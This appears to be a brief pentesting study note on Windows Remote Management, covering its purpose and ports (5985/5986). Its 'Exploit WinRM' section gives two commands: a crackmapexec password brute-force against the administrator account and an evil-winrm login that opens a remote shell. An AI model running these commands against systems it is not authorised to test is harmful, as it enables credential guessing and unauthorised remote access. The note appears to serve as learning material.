---
title: 'WinRM'
description: ''
pubDate: 'Jul 03 2022'
heroImage: '/ldapi.jpg'
tag: ['windows', 'winrm']
---

## Information

- Windows Remote Management is a remote management protocol that can be used to remote access with windows system over HTTP(S).

- Microsoft implemented WinRM in to Windows in order to make life easier for sysadmins.

- Remote access and intect with local network.

- Manage and configure windows systems remotely.

- Uses PCT port 5985 and 5986 (HTTPS).

## Exploit WinRM

- Implements access control and security for communication between systems through various forms of authentication.

- crackmapexec to perform a brute-force on WinRM.

- Ruby script called evil-winrm to obtain a command shell session.

```bash
crackmapexec winrm target -u administrator -p /usr/share/.../unix_passwd.txt

evil-winrm.rb -u administrator -p 'secretpass' -i target
```
